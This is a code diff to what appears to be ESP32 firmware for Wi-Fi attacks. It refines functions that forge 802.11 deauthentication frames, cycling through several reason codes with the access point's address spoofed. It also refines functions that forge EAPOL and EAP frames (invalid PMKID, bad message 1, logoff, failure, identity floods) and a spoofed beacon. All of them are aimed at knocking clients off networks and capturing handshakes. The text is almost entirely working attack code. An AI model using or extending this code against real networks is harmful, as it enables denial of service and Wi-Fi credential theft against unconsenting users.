@@ -12,7 +12,7 @@
 
 #define CLIENT_SEM_WAIT 10
 #define TARGET_SEM_WAIT 10
-#define BEACON_RX_TIMEOUT 2500
+#define BEACON_RX_TIMEOUT 3000
 
 static const char *TAG = "WIFI_ATTACKS";
 
@@ -36,16 +36,16 @@ static void beacon_track_task(void *param)
     while (1) {
         ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
 
-        if (xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(1000)) == pdTRUE) {
+        if (xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) {
             target.channel = getNextChannel(target.channel);
             esp_wifi_deauth_sta(0);
-            esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
+            esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_BELOW);
             ESP_LOGW(TAG, "BEACON timeout, ap is offline or changed channel. Switching to channel %d...", target.channel);
             handshake_info.pmkid_captured = false;
             handshake_info.handshake_captured = false;
-
             xSemaphoreGive(target_semaphore);
         }
+        xTimerReset(beacon_track_timer_handle, 0);
     }
 }
 
@@ -315,7 +315,6 @@ void wifi_attack_deauth_basic(void)
         return;
     }
 
-    static uint8_t reason_code = 5; /* Disassociated because AP is unable to handle all associated stations. */
     uint8_t deauth_packet[26] = {
         0xC0, 0x00, // Frame Control (Deauth)
         0x3A, 0x01, // Duration
@@ -327,13 +326,24 @@ void wifi_attack_deauth_basic(void)
     };
     memcpy(&deauth_packet[10], target_local.bssid, 6);    // Source Address
     memcpy(&deauth_packet[16], target_local.bssid, 6);    // BSSID
-    deauth_packet[24] = reason_code;
 
-    for (int i = 0; i <= num_clients; i++) 
+    for (int i = 0; i < num_clients; i++) 
     {
         memcpy(&deauth_packet[4], clients[i].mac, 6);
-        /* Send simple deauth addr1=client_mac, addr2=ap_mac, addr3=ap_mac */
-        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 1; /* Reason Code 1: Unspecified Reason */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 4; /* Reason Code 4: Disassociated Due to Inactivity */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 5; /* Reason Code 5: Disassociated Because AP Is Unable to Handle All Currently Associated Stations */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 6; /* Reason Code 6: Class 2 Frame Received from Non-Authenticated Station */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 7; /* Reason Code 7: Class 3 Frame Received from Non-Associated Station */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 8; /* Reason Code 8: Disassociated Because Station Is Leaving (or Has Left) BSS */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        deauth_packet[24] = 10; /* Reason Code 10: Disassociated Due to Invalid Security Parameters */
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
@@ -384,10 +394,10 @@ void wifi_attack_deauth_client_invalid_PMKID(void)
     }
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_packet_invalid_PMKID[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
         /* Increase replay counter for next packet */
         replay_counter++;
     }
@@ -444,10 +454,10 @@ void wifi_attack_deauth_client_bad_msg1(void)
     }
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
         /* Increase replay counter for next packet */
         replay_counter++;
     }
@@ -484,10 +494,10 @@ void wifi_attack_deauth_ap_eapol_logoff(void)
     memcpy(&eapol_logoff_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_logoff_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
@@ -527,10 +537,10 @@ void wifi_attack_deauth_client_eap_failure(void)
     memcpy(&eap_failure_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eap_failure_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_AP, eap_failure_packet, sizeof(eap_failure_packet), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
@@ -570,13 +580,13 @@ void wifi_attack_deauth_client_eap_rounds(void)
     memcpy(&eap_identity_request_packet[16], target_local.bssid, 6);    // BSSID
     
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eap_identity_request_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         for(uint8_t identity = 0; identity < 255; identity++ )
         {
             eap_identity_request_packet[38] = identity;
-            esp_wifi_80211_tx(WIFI_IF_AP, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
+            esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
             vTaskDelay(pdMS_TO_TICKS(1));
         }
     }
@@ -614,12 +624,12 @@ void wifi_attack_deauth_ap_eapol_start(void)
     memcpy(&eapol_start_packet[16], target_local.bssid, 6);    // BSSID
 
     /* Skip broadcast address */
-    for (uint8_t i = 1; i <= num_clients; i++) 
+    for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_start_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
         for(uint8_t burst = 0; burst < 3; burst++ )
         {
-            esp_wifi_80211_tx(WIFI_IF_AP, eapol_start_packet, sizeof(eapol_start_packet), false);
+            esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
             vTaskDelay(pdMS_TO_TICKS(2));
         }
     }
@@ -706,7 +716,7 @@ void wifi_attack_deauth_client_negative_tx_power(void)
     /* Spam 10 packets */
     for (uint8_t i = 10; i <= 10; i++) 
     {
-        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, offset, false);
+        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame_negative_tx, offset, false);
         vTaskDelay(pdMS_TO_TICKS(2));
     }
 }
